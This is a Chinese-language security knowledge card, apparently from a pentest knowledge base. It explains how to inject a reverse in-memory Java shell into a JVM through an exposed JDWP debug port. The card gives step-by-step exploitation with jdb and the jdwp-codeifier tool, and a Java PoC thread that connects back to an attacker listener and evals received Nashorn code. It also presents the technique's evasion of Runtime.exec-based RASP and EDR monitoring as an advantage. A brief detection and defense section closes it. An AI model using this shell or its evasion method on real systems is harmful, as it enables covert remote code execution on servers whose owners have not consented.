---
id: web-java-rce-jdwp-inject-reverse-java-memory-shell-scriptengine
title: JDWP 动态代码执行注入反向 Java 内存 Shell：ScriptEngine 交互线程反连回显，绕过 Runtime.exec 命令执行检测
type: scenario
domain: web
path: web/java/rce
technique: jdwp-reverse-java-memory-shell-scriptengine
aliases:
- JDWP 内存 Shell
- 反向 Java 内存 Shell
- jdwp-codeifier
- ScriptEngine 反弹 Shell
- jdb eval 执行代码
- 非命令执行反弹 Shell
tags:
- jdwp
- java
- jvm
- debug
- rce
- reverse-shell
- memshell
- scriptengine
- rasp-bypass
- evasion
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V631
  verified_at: '2026-11-12T23:48:11+08:00'
  notes: '已对照原文与4张图逐张核对：01 jdb -connect SocketAttach→threads→thread 0x25c(main 休眠)→stepi→eval java.lang.System.getProperty(''os.name'') 返回 Mac OS X；02 eval new javax.script.ScriptEngineManager() 报 com.sun.tools.example.debug.expr.ParseException: No class named（返回空值）；03 nc -lvv 8080 收到 os/user/host、var a=1、a+1=2.0、getProperty 回显；04 jdwp-codeifier.py -t/-p/-m rshell/-a/-l 命令、Dump vm description、step into thread 0x96c、success，nc 内 1+1=2 回显。卡片 Java 实现（ScriptEngineManager getEngineByName(''js'')、逐行 eval、>>> 提示符、exit/exit()、5 秒重连、life 分钟存活）、工具命令与参数均与原文一致。已修正一处原文未支持的推断：删去''jdwp-codeifier 采用的就是后者(完整类注入)''的确定表述，改为原文实际表述（未展开具体加载实现，仅说明可动态执行 Java/JS 代码并获得回显）。dedup 报告 5 候选均 related/new；最近候选 pentest-initial-access-jdwp-exposed-jvm-debug-rce（cos 0.9045）覆盖 JDWP 握手/jdb 附加/断点 eval/Runtime.exec 入口，本卡是其后注入 ScriptEngine 交互线程的反向 Java 内存 Shell，不创建子进程、不落文件，PoC 与检测点不同，非重复；与 web-java-rce-socket-revshell-stream-pump（ProcessBuilder+三线程泵）载荷不同；dup-scan.json 无涉及本篇 pair。原文未标注受影响版本（JDWP 暴露属配置问题，Nashorn 依赖仅作前提说明），不设 affected_versions
    正确。跳过项''反向 Java 内存代理''为原文仅提思路未实现，排除成立。未验证点：未在本机运行 jdwp-codeifier 与 nc 复现。'
---

## 一句话结论

JDWP 调试端口暴露时，不调用 `Runtime.exec`，而是通过 `jdb eval` 或 jdwp-codeifier 在目标 JVM 内执行 Java 代码，启动一个后台 Thread：循环反连攻击者监听端口，用 `ScriptEngineManager` 取 `js`（Nashorn）引擎逐行 `eval` 收到的代码并回显结果，连接失败每 5 秒重连、受最大存活时间限制。这样得到一个不创建子进程、不落文件、不触发命令执行类 RASP 钩子的交互式 Java 代码执行通道。

## 原理

- **JDWP 提供代码执行面**：JDWP 调试器可挂起线程并在其上下文执行 `eval` 表达式，等价于在目标 JVM 内执行任意可访问的 Java 代码；`jdb` 手工路径为 `threads` 找休眠线程（如 `main`）→ `thread <id>` → `stepi` → `eval java.lang.System.getProperty("os.name")`。
- **jdb eval 的类加载限制**：`eval new javax.script.ScriptEngineManager()` 会报 `No class named: javax.script.ScriptEngineManager`，说明交互式 eval 使用的类加载/解析路径不能直接加载任意类；因此实际注入通常需要把完整类（或代码）送进目标 JVM 由正常类加载器执行（原文未展开 jdwp-codeifier 的具体加载实现，仅说明其可动态执行 Java/JS 代码并获得回显）。
- **反向 Java Shell 实现**：注入的 `App` 线程在 `run()` 里循环 `new Socket(host, port)`，用 `ScriptEngineManager().getEngineByName("js")` 取 Nashorn 引擎；从 socket 读一行就 `scriptEngine.eval(code)`，把返回值（或异常）写回 socket 并输出 `>>> ` 提示符；`exit`/`exit()` 结束；外层按 `life` 分钟限制总存活时间，每次重连失败 sleep 5 秒。
- **为什么比命令执行隐蔽**：整个过程没有 `Runtime.exec`/`ProcessBuilder`，不产生子进程，也不落地二进制或脚本文件；命令执行类 RASP、EDR 的进程创建监控与命令审计都不会命中，流量只是 JVM 进程发起的普通 TCP 反连。执行能力来自目标 JVM 自身的脚本引擎与类路径。
- **工具链演进**：2014 年 jdwp-shellifier 用断点命中后调用 `Runtime.exec`；2020 年 Lz1y 改为对休眠线程发送单步事件（step-into）直接取上下文，不必等断点；2022 年 r3change 增加命令回显；jdwp-codeifier 在同一机制上支持动态执行 Java/JS 代码并内置该反向内存 Shell（`-m rshell`）。
- **可行前提**：目标 JDK 含 Nashorn（JDK 8/11 默认包含，JDK 15 起移除）；JDWP eval/注入路径可加载所需类；目标可出站 TCP 到攻击者监听地址。

## 触发条件

- 目标 JVM 以 JDWP server 模式监听且端口对攻击者可达（`address=*:5005`、8000 等；容器需发布端口）。
- 目标 JDK 有 `js` 脚本引擎（Nashorn；8/11 常见），或攻击者改用反射/字节码方案。
- 攻击者能监听回连端口，目标到该地址的出站 TCP 未被防火墙阻断。
- JDWP 会话可执行代码（jdb eval 或 jdwp-codeifier 注入）；无需任何应用认证。

## 利用步骤

1. 探测 JDWP：发送 `JDWP-Handshake`，返回同样字符串即确认；用 `jdb -connect com.sun.jdi.SocketAttach:hostname=<ip>,port=<port>` 附加。
2. `threads` 找休眠线程（如 `main`、`Common-Cleaner`），`thread <id>` 选中后 `stepi` 取得上下文；`eval java.lang.System.getProperty("os.name")` 验证代码执行。
3. 需要交互式能力时，把 `App` 线程类注入目标（jdwp-codeifier 自动完成注入与启动），或直接调用 `App.exploit(host, port, life)`。
4. 攻击机监听：`nc -lvv 8080`；工具命令：`python jdwp-codeifier.py -t <target> -p 8000 -m rshell -a <attacker>:8080 -l 0.1`（`-a` 回连地址，`-l` 最大存活分钟，每 5 秒重连）。
5. 收到 `>>>` 后输入 Java/JS 表达式（如 `1+1`、`java.lang.System.getProperty("os.name")`），结果原样回显；需要时在目标 JVM 内继续反射调用任意类。
6. `exit` 结束线程；连接断开后线程自动重连，超过 `life` 自动停止。

## PoC

文章给出完整 Java 实现与工具命令；核心骨架（未在本机复跑）：

```java
public class App extends Thread {
    private ScriptEngine scriptEngine;
    public void run() {
        while (存活时间 < life) {
            try (Socket socket = new Socket(host, port);
                 PrintWriter out = new PrintWriter(socket.getOutputStream());
                 BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
                scriptEngine = new ScriptEngineManager().getEngineByName("js");
                out.print(getInfo() + "\n\n>>> "); out.flush();
                String input;
                while ((input = in.readLine()) != null) {
                    if (input.trim().equals("exit")) return;
                    out.print(scriptEngine.eval(input) + "\n>>> "); out.flush();
                }
            } catch (Exception e) { /* ignore */ }
            Thread.sleep(5000);
        }
    }
    public static void exploit(String host, Integer port, Double life) { new App(host, port, life).start(); }
}
```

```bash
nc -lvv 8080
python jdwp-codeifier.py -t 192.168.65.254 -p 8000 -m rshell -a 127.0.0.1:8080 -l 0.1
```

手工 jdb 最小验证：

```text
> threads
> thread 0x25c
> stepi
> eval java.lang.System.getProperty("os.name")
```

## 变体与关联

- 入口与暴露面见 [[pentest-initial-access-jdwp-exposed-jvm-debug-rce]]：该卡覆盖 JDWP 握手、jdb 断点、`eval` 与 `Runtime.exec` RCE；本卡是其后的隐蔽载荷（不执行命令，直接注入内存 Shell）。
- 工具链变体：jdwp-shellifier（断点 + Runtime.exec）→ Lz1y step-into 版本 → r3change 回显版 → jdwp-codeifier（动态 Java/JS 代码 + 内置 rshell）；也可按同一思路写“反向 Java 内存代理”（SOCKS5 反连）代替 Shell。
- 变体：JDK 15+ 无 Nashorn 时需换脚本引擎、反射调用或直接注入字节码；RASP 若对 `ScriptEngineManager/eval` 或线程创建做监控，则需进一步改写加载方式。
- 关联：Java 内存马（Filter/Servlet/Agent）落在 Web 容器场景，见 [[web-java-component-tomcat-dynamic-filter-memshell]]；本卡是不依赖 Web 容器的 JVM 级反向 Shell。

## 检测与防御

- **检测**：JDWP 端口与 `JDWP-Handshake` 流量；JVM 进程出现异常出站长连接、非常规线程名（如 `App`）、`ScriptEngineManager`/Nashorn 的加载与 eval、无子进程却持续交互的 TCP 会话；EDR/RASP 可对 `javax.script`、`Thread.start`、自定义类加载做行为告警。
- **防御**：生产环境禁用 JDWP；必须调试时绑定回环并只允许本地端口转发；网络侧禁止 JVM 进程向不可信地址出站；容器使用非 root、只读根文件系统、最小权限；升级到无 Nashorn 的 JDK 只是减少可用引擎，不能替代关闭调试面。
